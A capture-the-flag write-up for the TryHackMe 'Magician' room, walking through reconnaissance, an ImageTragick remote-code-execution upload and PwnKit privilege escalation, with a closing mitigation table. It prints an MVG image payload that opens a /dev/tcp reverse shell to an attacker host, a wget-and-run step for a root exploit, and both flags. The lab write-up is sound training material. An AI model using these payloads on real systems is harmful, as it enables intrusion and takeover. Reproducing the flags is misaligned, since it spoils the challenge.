# CTF Write-Up: [Magician](https://tryhackme.com/room/magician)

> **Platform:** TryHackMe | **Difficulty:** Easy

---

## Flags

<details>
<summary>User Flag</summary>

`THM{simsalabim_hex_hex}`

</details>

<details>
<summary>Root Flag</summary>

`THM{magic_may_make_many_men_mad}`

</details>

---

## 1. Reconnaissance

### Initial Nmap Scan

```
nmap -vv -oN Nmap/Initial <IP_ADDRESS>
```

```
PORT     STATE SERVICE
21/tcp   open  ftp
8080/tcp open  http-proxy
8081/tcp open  http
```

### Detailed Nmap Scan

```
nmap -vv -oN Nmap/Detailed -p 21,8080,8081 -A <IP_ADDRESS>
```

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 2.0.8 |
| 8080 | HTTP (Spring Boot) | Apache Tomcat |
| 8081 | HTTP (Frontend) | nginx 1.14.0 (Ubuntu) |

### Web Enumeration (Gobuster)

```
gobuster dir -u http://magician:8080/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
```

```
/files    (Status: 200)
/upload   (Status: 405)  ← POST expected
/error    (Status: 500)
```

Port 8081 returned only static asset directories. Inspecting the Vue.js source (`/js/app.2af72f5c.js`) confirmed `/upload` and `/files` as the API endpoints on port 8080.

### FTP Enumeration

```
ftp <IP_ADDRESS>
Name: anonymous
```

The banner on successful login revealed two important hints:

- The `delay_successful_login` setting in `vsftpd.conf` (cosmetic delay, not a real lockout)
- A direct reference to [imagetragick.com](https://imagetragick.com) — pointing to **CVE-2016-3714**

```
230-Huh? The door just opens after some time? You're quite the patient one, aren't ya,
it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a
rookie, this might help you to get started: https://imagetragick.com.
You might need to do some little tweaks though...
```

---

## 2. Initial Access — ImageTragick RCE (CVE-2016-3714)

The web app on port 8081 accepts image uploads and converts them using **ImageMagick**. ImageMagick's MVG delegate processing is vulnerable to command injection via the `|` shell metacharacter.

Payload sourced from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Picture%20ImageMagick/imagetragik1_payload_imageover_reverse_shell_devtcp.jpg).

### Crafting the Payload

Create `shell.png` (an MVG file renamed to bypass the extension filter):

```
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/sh -i > /dev/tcp/<ATTACKER_IP>/80 0<&1 2>&1'
pop graphic-context
pop graphic-context
```

> **Note:** Renaming the `.mvg` file to `.png` was required to pass the upload filter — this was the "little tweak" hinted at in the FTP banner.

### Catching the Shell

```
nc -lvnp 80
```

Upload `shell.png` via `http://magician:8081/` and receive a reverse shell:

```
sh-4.4$ whoami
magician
```

---

## 3. User Flag

```
cat /home/magician/user.txt
```

> User flag: `THM{simsalabim_hex_hex}`

Notable files in `/home/magician/`:

- `the_magic_continues` — hints at a locally listening service ("a locally listening cat up his sleeve")
- `spring-boot-magician-backend-0.0.1-SNAPSHOT.jar` — the backend application
- `uploads/` — directory for processed images

---

## 4. Privilege Escalation — PwnKit (CVE-2021-4034)

### Enumeration

SUID binary enumeration revealed `pkexec`:

```
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/pkexec   ← CVE-2021-4034 (PwnKit)
```

### Exploit

On the attacking machine:

```
git clone https://github.com/ly4k/PwnKit
cd PwnKit && make
python3 -m http.server 8000
```

On the victim:

```
cd /tmp
wget http://<ATTACKER_IP>:8000/PwnKit -O PwnKit
chmod +x /tmp/PwnKit
/tmp/PwnKit
```

```
whoami
root
```

### Root Flag

```
cat /root/root.txt
```

> Root flag: `THM{magic_may_make_many_men_mad}`

---

## 5. Attack Chain

```
Nmap Scan
    └─► FTP (21), Spring Boot (8080), nginx/Vue.js (8081)

FTP Anonymous Login
    └─► Banner hints at ImageTragick (CVE-2016-3714)

Gobuster on port 8080
    └─► /upload (POST) and /files (GET) discovered

ImageTragick RCE
    └─► MVG reverse shell payload renamed to .png
    └─► Uploaded via http://magician:8081/
    └─► Reverse shell as magician → user.txt

SUID Enumeration
    └─► /usr/bin/pkexec → CVE-2021-4034 (PwnKit)

PwnKit
    └─► Root shell → root.txt
```

---

## 6. Vulnerabilities & Mitigations

| # | Vulnerability | Impact | Mitigation |
|---|---------------|--------|------------|
| 1 | FTP anonymous login leaks exploit hint | Attacker directed to ImageTragick | Disable anonymous FTP; remove banner hints |
| 2 | ImageMagick CVE-2016-3714 (ImageTragick) | RCE via malicious image upload | Patch ImageMagick; disable dangerous delegates |
| 3 | No file type validation on upload | Malicious MVG uploaded as PNG | Validate magic bytes, not just file extension |
| 4 | pkexec SUID (CVE-2021-4034 PwnKit) | Local privilege escalation to root | Patch polkit; remove SUID from pkexec |

---

*Magician — TryHackMe | Rooted ✅*
